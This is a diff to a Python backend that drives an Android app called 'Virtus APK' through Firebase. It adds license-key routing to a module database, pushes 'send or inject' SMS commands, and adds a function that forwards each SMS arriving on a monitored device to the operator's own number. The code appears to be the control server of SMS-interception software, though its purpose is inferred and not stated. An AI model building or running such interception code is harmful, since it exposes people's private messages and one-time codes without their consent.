@@ -22,6 +22,17 @@ def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
     return None
 
 
+def resolve_firebase_url(profile: MonitorProfile) -> str | None:
+    """Firebase URL where APK polls messages/commands."""
+    user_url = get_profile_firebase_url(profile)
+    if user_url:
+        return user_url
+    license_key = get_license_key(profile)
+    if license_key and license_key.upper().startswith("KEY-"):
+        return settings.virtus_module_db.rstrip("/")
+    return None
+
+
 def get_license_key(profile: MonitorProfile) -> str | None:
     if profile.license_key:
         return profile.license_key.strip()
@@ -44,27 +55,30 @@ async def _firebase_put(url: str, data: dict) -> None:
 
 
 async def push_virtus_config(profile: MonitorProfile, device: Device | None = None) -> None:
-    """Push config for Virtus APK: {firebase}/virtus_config.json"""
-    firebase_url = get_profile_firebase_url(profile)
+    """Push config for Virtus APK (virtus_config + module DB config/{KEY})."""
+    module_db = settings.virtus_module_db.rstrip("/")
+    firebase_url = resolve_firebase_url(profile)
     if not firebase_url:
         return
 
+    license_key = get_license_key(profile)
     device_id = device.name if device else ""
     payload = {
         "monitoring": profile.is_monitoring,
         "ts": int(time.time() * 1000),
         "firebase_url": firebase_url,
         "device_id": device_id,
-        "firebase_key": "",
+        "firebase_key": license_key if license_key and license_key.upper().startswith("KEY-") else "",
         "channel_id": profile.channel_id,
         "target_number": profile.phone_number,
         "sim_index": profile.selected_sim_index or 0,
     }
-    await _firebase_put(f"{firebase_url}/virtus_config", payload)
 
-    license_key = get_license_key(profile)
-    module_db = settings.virtus_module_db.rstrip("/")
-    if license_key and module_db and not license_key.lower().startswith("http"):
+    user_fb = get_profile_firebase_url(profile)
+    if user_fb:
+        await _firebase_put(f"{user_fb}/virtus_config", payload)
+
+    if license_key and license_key.upper().startswith("KEY-") and module_db:
         await _firebase_put(f"{module_db}/config/{_config_path_key(license_key)}", payload)
 
 
@@ -133,12 +147,12 @@ async def register_device_on_firebase(
 
 
 async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
-    if not get_profile_firebase_url(profile):
+    if not resolve_firebase_url(profile):
         return
     try:
         await push_virtus_config(profile, device)
         if device:
-            firebase_url = get_profile_firebase_url(profile)
+            firebase_url = resolve_firebase_url(profile)
             if firebase_url:
                 await register_device_on_firebase(firebase_url, device, profile)
     except Exception as exc:
@@ -151,7 +165,7 @@ async def push_outbound_to_firebase(
     outbound: OutboundSMS,
 ) -> str | None:
     """Push outgoing send or inject command to Firebase for Virtus APK."""
-    firebase_url = get_profile_firebase_url(profile)
+    firebase_url = resolve_firebase_url(profile)
     if not firebase_url:
         return None
 
@@ -173,3 +187,24 @@ async def push_outbound_to_firebase(
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
         return None
+
+
+async def forward_incoming_to_mynum(
+    db,
+    profile: MonitorProfile,
+    device: Device,
+    sender: str,
+    message: str,
+) -> None:
+    """Forward device incoming SMS to /mynum via outbox + Firebase commands."""
+    if not profile.phone_number or not profile.is_monitoring:
+        return
+
+    from app.channel_relay import queue_manual_sms
+
+    try:
+        body = message if sender in message else f"{sender}: {message}"
+        outbound = queue_manual_sms(db, profile, device, profile.phone_number, body)
+        await push_outbound_to_firebase(profile, device, outbound)
+    except Exception as exc:
+        logger.warning("Forward to mynum failed for device %s: %s", device.id, exc)
